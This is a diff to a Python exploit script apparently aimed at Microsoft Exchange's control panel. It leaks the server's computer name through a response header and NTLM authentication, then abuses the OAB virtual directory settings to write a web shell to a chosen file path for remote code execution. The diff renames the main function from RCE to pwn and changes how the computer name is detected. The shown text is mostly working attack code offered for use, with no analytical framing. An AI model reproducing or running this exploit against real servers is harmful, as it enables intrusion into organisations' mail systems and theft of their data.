@@ -2,7 +2,6 @@ import requests, urllib3, sys, re, base64, random
 from impacket import ntlm
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
-
 def gen():
     return ''.join(random.choice("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789") for _ in range(0x5))
 
@@ -26,7 +25,7 @@ get_RawIdentity = {'properties':{'Parameters':{'__type':'JsonDictionaryOfanyType
 OABVirtualDirectory = {'identity': {'__type': 'Identity:ECP', 'DisplayName': 'OAB (Default Web Site)', 'RawIdentity': '{}' },'properties': {'Parameters': {'__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','ExternalUrl': 'http://host/#{}'.format(shell_src)}}}
 ResetOABVirtualDirectory = {'identity': {'__type': 'Identity:ECP','DisplayName': 'OAB (Default Web Site)', 'RawIdentity': '{}' },'properties': {'Parameters': {'__type': 'JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel','FilePathName': '{}'.format(shell_path) }}}
 
-def RCE(host, email):
+def pwn(host, email):
     session = requests.Session()
     session.headers.update(user_agent)
     
@@ -35,10 +34,13 @@ def RCE(host, email):
 
     print("[+] leaking required infos ..")
     CN, used_ntlm = get_CN(session, host)
-    print("[*] Computer Name: {}".format(CN))
 
     if not used_ntlm:
-        do_NTLM(session, host, just_enum=True)
+        ntlm_CN = do_NTLM(session, host, just_enum=True)
+        if CN != ntlm_CN:
+            print("[WARNING] found 2 different Computer Names")
+            print("[WARNING] using Computer Name from NTLM auth: {}".format(ntlm_CN))
+            CN = ntlm_CN
     else:
         pass
 
@@ -77,6 +79,7 @@ def get_CN(session, host):
         exit(1)
 
     if "X-FEServer" in response.headers.keys():
+        print("[*] Computer Name (from 'X-FEServer' header): {}".format(response.headers["X-FEServer"]))
         return response.headers["X-FEServer"], False
     else:
         print("[WARNING] backend name not found in response headers")
@@ -309,7 +312,7 @@ def do_NTLM(session, host, RPC_address=None, just_enum=False):
                 print("\t[NTLM] DNS tree name (FQDN): {}".format(tree_FQDN))
 
     del session.headers["Authorization"]
-    return 0 if just_enum else CN
+    return CN
 
 def ntlm_exposed(session, url):
     auth_request = {"Authorization": "NTLM TlRMTVNTUAABAAAABQKIoAAAAAAAAAAAAAAAAAAAAAA="}
@@ -351,4 +354,4 @@ if __name__ == "__main__":
         print("Usage: python3 {} https://mail.corp.com email@corp.com".format(sys.argv[0]))
         exit(1)
     
-    RCE(sys.argv[1], sys.argv[2])
+    pwn(sys.argv[1], sys.argv[2])
